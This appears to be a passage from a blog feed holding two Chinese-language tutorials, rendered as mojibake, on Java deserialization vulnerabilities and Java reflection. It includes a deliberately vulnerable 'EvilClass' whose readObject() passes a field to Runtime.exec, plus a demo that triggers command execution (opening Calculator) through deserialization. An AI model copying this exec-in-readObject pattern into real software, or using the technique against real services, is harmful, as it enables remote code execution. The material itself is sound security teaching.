<h2 id="0x04-readObject-æ–¹æ³•"><a href="#0x04-readObject-æ–¹æ³•" class="headerlink" title="0x04 readObject()æ–¹æ³•"></a>0x04 readObject()æ–¹æ³•</h2><p>ç‰¹åœ°æåˆ°è¿™ä¸ªæ–¹æ³•æ˜¯å› ä¸ºåœ¨ååºåˆ—åŒ–æ¼æ´ä¸­å®ƒèµ·åˆ°äº†å…³é”®ä½œç”¨ã€‚å› ä¸ºåœ¨åºåˆ—åŒ–è¿‡ç¨‹ä¸­ï¼ŒJVMè™šæ‹Ÿæœºä¼šè¯•å›¾è°ƒç”¨å¯¹è±¡ç±»é‡Œçš„ <code>writeObject</code> å’Œ <code>readObject</code> æ–¹æ³•ï¼Œè¿›è¡Œç”¨æˆ·è‡ªå®šä¹‰çš„åºåˆ—åŒ–å’Œååºåˆ—åŒ–ï¼Œå¦‚æœæ²¡æœ‰è¿™æ ·çš„æ–¹æ³•ï¼Œåˆ™é»˜è®¤è°ƒç”¨æ˜¯ <code>ObjectOutputStream</code> çš„ <code>defaultWriteObject</code> æ–¹æ³•ä»¥åŠ <code>ObjectInputStream</code> çš„ <code>defaultReadObject</code> æ–¹æ³•ã€‚ç”¨æˆ·è‡ªå®šä¹‰çš„ <code>writeObject</code> å’Œ <code>readObject</code> æ–¹æ³•å¯ä»¥å…è®¸ç”¨æˆ·æ§åˆ¶åºåˆ—åŒ–çš„è¿‡ç¨‹ï¼Œæ¯”å¦‚å¯ä»¥åœ¨åºåˆ—åŒ–çš„è¿‡ç¨‹ä¸­åŠ¨æ€æ”¹å˜åºåˆ—åŒ–çš„æ•°å€¼ã€‚ </p>
<blockquote>
<p>  Javaååºåˆ—åŒ–çš„è¿‡ç¨‹ä¸­å¯ä»¥è‡ªåŠ¨æ‰§è¡Œåºåˆ—åŒ–ç±»çš„å››ä¸ªæ–¹æ³•ï¼Œå®ç°äº†<code>Serializable</code>æ¥å£å¯ä»¥æ‰§è¡Œçš„æ–¹æ³•åŒ…æ‹¬<code>readObject</code>ã€<code>readObjectNoData</code>ã€<code>readResolve</code>ï¼Œä»¥åŠå®ç°äº†<code>Externalizable</code>æ¥å£çš„<code>readExternal</code>æ–¹æ³•ã€‚è¿™äº›åœ¨æ‰¾ååºåˆ—åŒ–æ¼æ´æ—¶éƒ½éœ€è¦é‡ç‚¹å…³æ³¨ã€‚</p>
</blockquote>
<p>å¦‚æœ<code>readObject</code>æ–¹æ³•ä¹¦å†™ä¸å½“çš„è¯å°±æœ‰å¯èƒ½å¼•å‘æ¶æ„ä»£ç çš„æ‰§è¡Œï¼Œä¾‹å¦‚</p>
<p><strong>åŸºæœ¬ç±»</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> yhy;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> yhy</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@date</span> 2021/4/4 23:34</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@github</span> https://github.com/yhy0</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.Serializable;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">EvilClass</span> <span class="keyword">implements</span> <span class="title class_">Serializable</span> &#123;</span><br><span class="line">    String name;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">EvilClass</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="built_in">this</span>.getClass() + <span class="string">&quot;çš„EvilClass()æ— å‚æ„é€ æ–¹æ³•è¢«è°ƒç”¨!!!!!!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">EvilClass</span><span class="params">(String name)</span> &#123;</span><br><span class="line">        System.out.println(<span class="built_in">this</span>.getClass() + <span class="string">&quot;çš„EvilClass(String name)æ„é€ æ–¹æ³•è¢«è°ƒç”¨!!!!!!&quot;</span>);</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getName</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="built_in">this</span>.getClass() + <span class="string">&quot;çš„getNameè¢«è°ƒç”¨!!!!!!&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setName</span><span class="params">(String name)</span> &#123;</span><br><span class="line">        System.out.println(<span class="built_in">this</span>.getClass() + <span class="string">&quot;çš„setNameè¢«è°ƒç”¨!!!!!!&quot;</span>);</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">toString</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="built_in">this</span>.getClass() + <span class="string">&quot;çš„toString()è¢«è°ƒç”¨!!!!!!&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;EvilClass&#123;&quot;</span> +</span><br><span class="line">                <span class="string">&quot;name=&#x27;&quot;</span> + getName() + <span class="string">&#x27;\&#x27;&#x27;</span> +</span><br><span class="line">                <span class="string">&#x27;&#125;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(ObjectInputStream in)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="comment">//æ‰§è¡Œé»˜è®¤çš„readObject()æ–¹æ³•</span></span><br><span class="line">        in.defaultReadObject();</span><br><span class="line">        System.out.println(<span class="built_in">this</span>.getClass() + <span class="string">&quot;çš„readObject()è¢«è°ƒç”¨!!!!!!&quot;</span>);</span><br><span class="line">        <span class="comment">// windows</span></span><br><span class="line"><span class="comment">//        Runtime.getRuntime().exec(new String[]&#123;&quot;cmd&quot;, &quot;/c&quot;, name&#125;);</span></span><br><span class="line">        <span class="comment">// mac</span></span><br><span class="line">        Runtime.getRuntime().exec(<span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;open&quot;</span>, <span class="string">&quot;-a&quot;</span>, name&#125;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>readObject</code>ä¸­å­˜åœ¨æ‰§è¡Œå‘½ä»¤çš„ä»£ç <code>Runtime.getRuntime().exec(new String[]&#123;&quot;open&quot;, &quot;-a&quot;, name&#125;)</code>ï¼Œnameå‚æ•°æ˜¯è¦æ‰§è¡Œçš„å‘½ä»¤ã€‚é‚£ä¹ˆæˆ‘ä»¬å¯ä»¥æ„é€ ä¸€ä¸ªæ¶æ„çš„å¯¹è±¡ï¼Œå°†å…¶nameå±æ€§èµ‹å€¼ä¸ºè¦æ‰§è¡Œçš„å‘½ä»¤ï¼Œå½“ååºåˆ—åŒ–è§¦å‘<code>readObject</code>æ—¶å°±ä¼šRCEã€‚å¦‚ä¸‹</p>
<p><strong>åºåˆ—åŒ–å’Œååºåˆ—åŒ–</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> yhy;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> yhy</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@date</span> 2021/4/4 23:36</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@github</span> https://github.com/yhy0</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">EvilSerialize</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">EvilClass</span> <span class="variable">evilObj</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">EvilClass</span>();</span><br><span class="line"><span class="comment">//        evilObj.setName(&quot;calc&quot;);</span></span><br><span class="line">        <span class="comment">// mac</span></span><br><span class="line">        evilObj.setName(<span class="string">&quot;Calculator&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// åºåˆ—åŒ–ä¸ºå­—èŠ‚æ•°ç»„</span></span><br><span class="line">        <span class="type">byte</span>[] bytes = serializeToBytes(evilObj);</span><br><span class="line">	<span class="comment">// ååºåˆ—åŒ–</span></span><br><span class="line">        <span class="type">EvilClass</span> <span class="variable">o</span> <span class="operator">=</span> (EvilClass)deserializeFromBytes(bytes);</span><br><span class="line">        System.out.println(o);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">byte</span>[] serializeToBytes(<span class="keyword">final</span> Object obj) <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="keyword">final</span> <span class="type">ByteArrayOutputStream</span> <span class="variable">out</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="keyword">final</span> <span class="type">ObjectOutputStream</span> <span class="variable">objOut</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(out);</span><br><span class="line">        objOut.writeObject(obj);</span><br><span class="line">        objOut.flush();</span><br><span class="line">        objOut.close();</span><br><span class="line">        <span class="keyword">return</span> out.toByteArray();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">deserializeFromBytes</span><span class="params">(<span class="keyword">final</span> <span class="type">byte</span>[] serialized)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="keyword">final</span> <span class="type">ByteArrayInputStream</span> <span class="variable">in</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(serialized);</span><br><span class="line">        <span class="keyword">final</span> <span class="type">ObjectInputStream</span> <span class="variable">objIn</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(in);</span><br><span class="line">        <span class="keyword">return</span> objIn.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210405211527.png" alt="image-20210405000541157"></p>
<p>è¿™æ˜¯ä¸€ä¸ªæç«¯çš„ä¾‹å­ï¼Œåœ¨çœŸå®åœºæ™¯ä¸­ï¼Œä¸ä¼šæœ‰äººçœŸçš„è¿™æ ·ç›´æ¥å†™ä¸€å¥æ‰§è¡Œå‘½ä»¤çš„ä»£ç åœ¨readObject()ä¸­ï¼Œè¿™æ ·å†™çš„å¼€å‘ç»å¯¹ä¼šè¢«æ‹‰å‡ºå»ç¥­å¤©çš„ã€‚æ‰€ä»¥ååºåˆ—åŒ–æ¼æ´é€šå¸¸ä¼šéœ€è¦Javaçš„ä¸€äº›ç‰¹æ€§è¿›è¡Œé…åˆæ¯”å¦‚<code>åå°„(invoke)</code>ã€‚ç„¶åå°±æ˜¯åˆ©ç”¨é“¾çš„å¯»æ‰¾ã€‚ååºåˆ—åŒ–æ¼æ´éœ€è¦ä¸‰ä¸ªä¸œè¥¿</p>
<ol>
<li>ååºåˆ—åŒ–å…¥å£(source)</li>
<li>ç›®æ ‡æ–¹æ³•(sink)</li>
<li>åˆ©ç”¨é“¾(gadget chain)</li>
</ol>
<p>å¤§ä½¬ä»¬åŸºæœ¬éƒ½ä¼šå»å¯»æ‰¾é‡å†™äº†è¿™ä¸ª<code>readObject</code>æ–¹æ³•çš„ç±»ï¼Œå¹¶é…åˆJavaçš„<code>invoke</code>åå°„æœºåˆ¶ï¼Œæ„é€ åˆ©ç”¨é“¾ï¼Œå½¢æˆäº†Javaä¸­æœ€å…·ç‰¹è‰²çš„ååºåˆ—åŒ–æ”»å‡»ã€‚è€Œä¸”å†çœ‹ä¸Šå›¾ä¸­çš„è¾“å‡ºç»“æœï¼Œä¸ä»…ä»…è§¦å‘äº†<code>readObject</code>æ–¹æ³•ï¼Œè¿˜è§¦å‘äº†<code>toString()</code>ã€<code>æ— å‚æ„é€ </code>ã€<code>set</code>ã€<code>get</code>æ–¹æ³•ï¼Œé‚£ä¹ˆåœ¨å®é™…å¯»æ‰¾åˆ©ç”¨é“¾çš„è¿‡ç¨‹ä¸­å°±ä¸ä»…ä»…éœ€è¦å…³æ³¨<code>readObject()</code>çš„æ–¹æ³•äº†ã€‚</p>
<p>ä»£ç åœ°å€ï¼š<a href="https://github.com/yhy0/JavaSerializeDemo">https://github.com/yhy0/JavaSerializeDemo</a></p>
<h2 id="0x05-å‚è€ƒ"><a href="#0x05-å‚è€ƒ" class="headerlink" title="0x05 å‚è€ƒ"></a>0x05 å‚è€ƒ</h2><p>Javaååºåˆ—ä¹‹ä»èŒæ–°åˆ°èœé¸Ÿ <a href="https://www.kingkk.com/2019/01/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E4%B9%8B%E4%BB%8E%E8%90%8C%E6%96%B0%E5%88%B0%E8%8F%9C%E9%B8%9F/">https://www.kingkk.com/2019/01/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E4%B9%8B%E4%BB%8E%E8%90%8C%E6%96%B0%E5%88%B0%E8%8F%9C%E9%B8%9F/</a> </p>
<p>Javaååºåˆ—åŒ–æŠ€æœ¯åˆ†äº« <a href="https://github.com/Y4er/WebLogic-Shiro-shell">https://github.com/Y4er/WebLogic-Shiro-shell</a> </p>
]]></content>
      <categories>
        <category>æ¼æ´åŸç†</category>
      </categories>
      <tags>
        <tag>æ¼æ´åŸç†</tag>
      </tags>
  </entry>
  <entry>
    <title>åˆæ¢Javaååºåˆ—åŒ–æ¼æ´(äºŒ)</title>
    <url>/2021/05/02/%E5%88%9D%E6%8E%A2Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E(%E4%BA%8C)/</url>
    <content><![CDATA[<blockquote>
<p>  ä¸èƒ½é£Ÿè¨€ï¼Œå†æ™šä¹Ÿè¦å†™</p>
</blockquote>
<h2 id="0x01-Javaåå°„"><a href="#0x01-Javaåå°„" class="headerlink" title="0x01 Javaåå°„"></a>0x01 Javaåå°„</h2><p>åå°„ä¹‹ä¸­åŒ…å«äº†ä¸€ä¸ªã€Œåã€å­—ï¼Œæœ‰ã€Œåã€å°±ä¼šæœ‰ã€Œæ­£ã€ï¼Œé‚£ä¹ˆè§£é‡Šåå°„å°±å¿…é¡»å…ˆä»ã€Œæ­£ã€å¼€å§‹è§£é‡Šã€‚</p>
<p>ä¸€èˆ¬æƒ…å†µä¸‹ï¼Œå½“ä½¿ç”¨æŸä¸ªç±»æ—¶å¿…å®šçŸ¥é“å®ƒæ˜¯ä»€ä¹ˆç±»ï¼ˆç±»åï¼‰ï¼Œæ˜¯ç”¨æ¥åšä»€ä¹ˆçš„ï¼ˆç±»çš„å±æ€§å’Œæ–¹æ³•ï¼‰ã€‚äºæ˜¯æˆ‘ä»¬ç›´æ¥å¯¹è¿™ä¸ªç±»è¿›è¡Œå®ä¾‹åŒ–ï¼Œä¹‹åä½¿ç”¨è¿™ä¸ªç±»å¯¹è±¡è¿›è¡Œæ“ä½œã€‚</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">User</span> <span class="variable">user</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">User</span>();</span><br><span class="line">user.setName(<span class="string">&quot;yhy&quot;</span>);</span><br><span class="line">System.out.println(user.getName());</span><br></pre></td></tr></table></figure>

<p>â€œæ­£å°„â€å°±æ˜¯é€šè¿‡newåˆ›å»ºäº†ä¸€ä¸ª<strong>User</strong>å®ä¾‹ï¼Œç„¶åé€šè¿‡å®ä¾‹(user)å»è°ƒç”¨å…¶æ‰€å±æ–¹æ³•ã€‚</p>
<p>ä½†æ˜¯å½“ä½ <strong>new</strong>çš„æ—¶å€™ä¸çŸ¥é“ç±»åæ€ä¹ˆåŠï¼Ÿå—<strong>private</strong>ä¿æŠ¤çš„æ–¹æ³•æ€ä¹ˆè°ƒç”¨ï¼Ÿè¿™æ—¶å€™åå°„çš„ä½œç”¨å°±ä½“ç°å‡ºæ¥äº†ã€‚</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// new</span></span><br><span class="line"><span class="type">Class</span> <span class="variable">clz</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;yhy.reflect.User&quot;</span>);</span><br><span class="line"><span class="type">Object</span> <span class="variable">object</span> <span class="operator">=</span> clz.newInstance();</span><br><span class="line"></span><br><span class="line"><span class="comment">// setName(&quot;yhy&quot;)</span></span><br><span class="line"><span class="type">Method</span> <span class="variable">method</span> <span class="operator">=</span> clz.getMethod(<span class="string">&quot;setName&quot;</span>, String.class);</span><br><span class="line">method.invoke(object, <span class="string">&quot;yhy&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// getName()</span></span><br><span class="line"><span class="type">Method</span> <span class="variable">name</span> <span class="operator">=</span> clz.getDeclaredMethod(<span class="string">&quot;getName&quot;</span>,<span class="literal">null</span>);</span><br><span class="line"><span class="type">Object</span> <span class="variable">o1</span> <span class="operator">=</span> name.invoke(object, <span class="literal">null</span>);</span><br><span class="line">System.out.println(o1);</span><br></pre></td></tr></table></figure>

<p>ä¸Šé¢ä¸¤æ®µä»£ç çš„æ‰§è¡Œç»“æœï¼Œæ˜¯å®Œå…¨ä¸€æ ·çš„ã€‚ä½†æ˜¯å…¶æ€è·¯å®Œå…¨ä¸ä¸€æ ·ï¼Œç¬¬ä¸€æ®µä»£ç åœ¨æœªè¿è¡Œæ—¶å°±å·²ç»ç¡®å®šäº†è¦è¿è¡Œçš„ç±»ï¼ˆUserï¼‰ï¼Œè€Œç¬¬äºŒæ®µä»£ç åˆ™æ˜¯åœ¨è¿è¡Œæ—¶é€šè¿‡å­—ç¬¦ä¸²å€¼æ‰å¾—çŸ¥è¦è¿è¡Œçš„ç±»ï¼ˆyhy.reflect.Userï¼‰ã€‚</p>
<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210502224435.png"></p>
<p>æ‰€ä»¥è¯´ä»€ä¹ˆæ˜¯åå°„ï¼Ÿ</p>
<p><strong>åå°„å°±æ˜¯åœ¨ç¨‹åºè¿è¡Œæ—¶åŠ¨æ€åŠ è½½ç±»å¹¶è·å–ç±»çš„è¯¦ç»†ä¿¡æ¯ï¼Œä»è€Œæ“ä½œç±»æˆ–å¯¹è±¡çš„å±æ€§å’Œæ–¹æ³•ã€‚</strong></p>
<p>javaåå°„æœºåˆ¶ç»™æ¼æ´åˆ©ç”¨æä¾›äº†å¾ˆå¤šä¾¿åˆ©ï¼Œæˆ‘ä»¬å¯ä»¥åœ¨å¾ˆå¤šjavaæ¼æ´çš„expä¸­çœ‹åˆ°å®ƒçš„å½±å­ï¼Œæ‰€ä»¥ï¼Œå­¦ä¹ javaå®‰å…¨æ˜¯ç»•ä¸å¼€å®ƒçš„ã€‚</p>
<blockquote>
<p>  Javaå±äºå…ˆç¼–è¯‘å†è¿è¡Œçš„è¯­è¨€ï¼Œç¨‹åºä¸­å¯¹è±¡çš„ç±»å‹åœ¨ç¼–è¯‘æœŸå°±ç¡®å®šä¸‹æ¥äº†ï¼Œè€Œå½“ç¨‹åºåœ¨è¿è¡Œæ—¶å¯èƒ½éœ€è¦åŠ¨æ€åŠ è½½æŸäº›ç±»ï¼Œè¿™äº›ç±»å› ä¸ºä¹‹å‰ç”¨ä¸åˆ°ï¼Œæ‰€ä»¥æ²¡æœ‰è¢«åŠ è½½åˆ°JVMã€‚é€šè¿‡åå°„ï¼Œå¯ä»¥åœ¨è¿è¡Œæ—¶åŠ¨æ€åœ°åˆ›å»ºå¯¹è±¡å¹¶è°ƒç”¨å…¶å±æ€§ï¼Œä¸éœ€è¦æå‰åœ¨ç¼–è¯‘æœŸçŸ¥é“è¿è¡Œçš„å¯¹è±¡æ˜¯è°ã€‚</p>
</blockquote>
<h2 id="0x02-åå°„å¸¸ç”¨API"><a href="#0x02-åå°„å¸¸ç”¨API" class="headerlink" title="0x02 åå°„å¸¸ç”¨API"></a>0x02 åå°„å¸¸ç”¨API</h2><h3 id="2-1-è·å–Classå¯¹è±¡"><a href="#2-1-è·å–Classå¯¹è±¡" class="headerlink" title="2.1 è·å–Classå¯¹è±¡"></a>2.1 è·å–Classå¯¹è±¡</h3><p>åœ¨åå°„ä¸­ï¼Œè¦è·å–ä¸€ä¸ªç±»æˆ–è°ƒç”¨ä¸€ä¸ªç±»çš„æ–¹æ³•ï¼Œæˆ‘ä»¬é¦–å…ˆéœ€è¦è·å–åˆ°è¯¥ç±»çš„ Class å¯¹è±¡ã€‚</p>
<p>åœ¨ Java API ä¸­ï¼Œè·å– Class ç±»å¯¹è±¡æœ‰ä¸‰ç§æ–¹æ³•ï¼š</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 1.é€šè¿‡å­—ç¬¦ä¸²è·å–Classå¯¹è±¡ï¼Œè¿™ä¸ªå­—ç¬¦ä¸²å¿…é¡»å¸¦ä¸Šå®Œæ•´è·¯å¾„å</span></span><br><span class="line"><span class="type">Class</span> <span class="variable">clz</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;yhy.reflect.User&quot;</span>);</span><br><span class="line"><span class="comment">// 2.é€šè¿‡ç±»çš„classå±æ€§</span></span><br><span class="line"><span class="type">Class</span> <span class="variable">clz</span> <span class="operator">=</span> User.class;</span><br><span class="line"><span class="comment">// 3.é€šè¿‡å¯¹è±¡çš„getClass()å‡½æ•°</span></span><br><span class="line"><span class="type">User</span> <span class="variable">user</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">User</span>();</span><br><span class="line"><span class="type">Class</span> <span class="variable">clz</span> <span class="operator">=</span> user.getClass();</span><br></pre></td></tr></table></figure>

<ul>
<li>ç¬¬ä¸€ç§æ–¹æ³•æ˜¯é€šè¿‡ç±»çš„å…¨è·¯å¾„å­—ç¬¦ä¸²è·å– Class å¯¹è±¡ï¼Œè¿™ä¹Ÿæ˜¯å¹³æ—¶æœ€å¸¸ç”¨çš„åå°„è·å– Class å¯¹è±¡çš„æ–¹æ³•ï¼›</li>
<li>ç¬¬äºŒç§æ–¹æ³•æœ‰é™åˆ¶æ¡ä»¶ï¼šéœ€è¦å¯¼å…¥ç±»çš„åŒ…ï¼›</li>
<li>ç¬¬ä¸‰ç§æ–¹æ³•å·²ç»æœ‰äº† User å¯¹è±¡ï¼Œä¸å†éœ€è¦åå°„ã€‚</li>
</ul>
<h3 id="2-2-é€šè¿‡åå°„åˆ›å»ºç±»å¯¹è±¡"><a href="#2-2-é€šè¿‡åå°„åˆ›å»ºç±»å¯¹è±¡" class="headerlink" title="2.2 é€šè¿‡åå°„åˆ›å»ºç±»å¯¹è±¡"></a>2.2 é€šè¿‡åå°„åˆ›å»ºç±»å¯¹è±¡</h3><p>é€šè¿‡åå°„åˆ›å»ºç±»å¯¹è±¡ä¸»è¦æœ‰ä¸¤ç§æ–¹å¼ï¼š</p>
<p><strong>ç¬¬ä¸€ç§ï¼šé€šè¿‡ Class å¯¹è±¡çš„ newInstance() æ–¹æ³•</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Class</span> <span class="variable">clz</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;yhy.reflect.User&quot;</span>);</span><br><span class="line"><span class="type">Object</span> <span class="variable">object</span> <span class="operator">=</span> clz.newInstance();</span><br></pre></td></tr></table></figure>

<p><strong>ç¬¬äºŒç§ï¼šé€šè¿‡ Constructor å¯¹è±¡çš„ newInstance() æ–¹æ³•</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Class</span> <span class="variable">clz</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;yhy.reflect.User&quot;</span>);</span><br><span class="line"><span class="type">Constructor</span> <span class="variable">constructor</span> <span class="operator">=</span> clz.getConstructor();</span><br><span class="line"><span class="type">Object</span> <span class="variable">object</span> <span class="operator">=</span> constructor.newInstance();</span><br></pre></td></tr></table></figure>

<p>é€šè¿‡ <strong>Constructor</strong> å¯¹è±¡åˆ›å»ºç±»å¯¹è±¡å¯ä»¥é€‰æ‹©ç‰¹å®šæ„é€ æ–¹æ³•ï¼Œè€Œé€šè¿‡ <strong>Class</strong> å¯¹è±¡åˆ™åªèƒ½ä½¿ç”¨é»˜è®¤çš„æ— å‚æ•°æ„é€ æ–¹æ³•ã€‚ä¸‹é¢çš„ä»£ç å°±è°ƒç”¨äº†ä¸€ä¸ªæœ‰å‚æ•°çš„æ„é€ æ–¹æ³•è¿›è¡Œäº†ç±»å¯¹è±¡çš„åˆå§‹åŒ–ã€‚</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Class</span> <span class="variable">clz</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;yhy.reflect.User&quot;</span>);</span><br><span class="line"><span class="type">Constructor</span> <span class="variable">constructor</span> <span class="operator">=</span> clz.getConstructor(String.class);</span><br><span class="line"><span class="type">Object</span> <span class="variable">object</span> <span class="operator">=</span> constructor.newInstance(<span class="string">&quot;yhy&quot;</span>);</span><br></pre></td></tr></table></figure>

<h3 id="2-3-é€šè¿‡åå°„è·å–ç±»å±æ€§ã€æ–¹æ³•ã€æ„é€ å™¨"><a href="#2-3-é€šè¿‡åå°„è·å–ç±»å±æ€§ã€æ–¹æ³•ã€æ„é€ å™¨" class="headerlink" title="2.3 é€šè¿‡åå°„è·å–ç±»å±æ€§ã€æ–¹æ³•ã€æ„é€ å™¨"></a>2.3 é€šè¿‡åå°„è·å–ç±»å±æ€§ã€æ–¹æ³•ã€æ„é€ å™¨</h3><p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210502224545.png"></p>
<p>ä¸¤ä¸ªå±æ€§ï¼šä¸€ä¸ª<strong>å…¬æœ‰(age)<strong>ï¼Œä¸€ä¸ª</strong>ç§æœ‰(Name)</strong></p>
<p>æˆ‘ä»¬é€šè¿‡ <strong>Class</strong> å¯¹è±¡çš„ <strong>getFields()</strong> æ–¹æ³•å¯ä»¥è·å– Class ç±»çš„å±æ€§ï¼Œä½†æ— æ³•è·å–ç§æœ‰å±æ€§ã€‚</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Class</span> <span class="variable">clz</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;yhy.reflect.User&quot;</span>);</span><br><span class="line">Field[] fields = clz.getFields();</span><br><span class="line"><span class="keyword">for</span> (Field field : fields) &#123;</span><br><span class="line">    System.out.println(field.getName());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210502224502.png"></p>
<p>è€Œå¦‚æœä½¿ç”¨ <strong>Class</strong> å¯¹è±¡çš„ **getDeclaredFields() **æ–¹æ³•åˆ™å¯ä»¥è·å–åŒ…æ‹¬ç§æœ‰å±æ€§åœ¨å†…çš„æ‰€æœ‰å±æ€§ï¼š</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Class</span> <span class="variable">clz</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;yhy.reflect.User&quot;</span>);</span><br><span class="line">Field[] fields = clz.getDeclaredFields();</span><br><span class="line"><span class="keyword">for</span> (Field field : fields) &#123;</span><br><span class="line">    System.out.println(field.getName());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210502224558.png"></p>
<p>ä¸è·å–ç±»å±æ€§ä¸€æ ·ï¼Œå½“æˆ‘ä»¬å»è·å–ç±»æ–¹æ³•ã€ç±»æ„é€ å™¨æ—¶ï¼Œå¦‚æœè¦è·å–ç§æœ‰æ–¹æ³•æˆ–ç§æœ‰æ„é€ å™¨ï¼Œåˆ™å¿…é¡»ä½¿ç”¨æœ‰ declared å…³é”®å­—çš„æ–¹æ³•ã€‚</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// è·å–æ‰€æœ‰å£°æ˜çš„æ„é€ æ–¹æ³•</span></span><br><span class="line">getDeclaredConstructors()</span><br><span class="line"><span class="comment">// è·å–æ‰€æœ‰å…¬æœ‰çš„æ„é€ æ–¹æ³•</span></span><br><span class="line">getConstructors()</span><br><span class="line"></span><br><span class="line"><span class="comment">// è·å–æ‰€æœ‰å£°æ˜çš„æ–¹æ³•</span></span><br><span class="line">getDeclaredMethods()</span><br><span class="line"><span class="comment">// è·å–æ‰€æœ‰å…¬æœ‰çš„å‡½æ•°</span></span><br><span class="line">getMethods()</span><br></pre></td></tr></table></figure>

<p>ä»£ç åœ°å€ï¼š<a href="https://github.com/yhy0/JavaSerializeDemo">https://github.com/yhy0/JavaSerializeDemo</a></p>
]]></content>
      <categories>
        <category>æ¼æ´åŸç†</category>
      </categories>
      <tags>
        <tag>æ¼æ´åŸç†</tag>
      </tags>
  </entry>
  <entry>
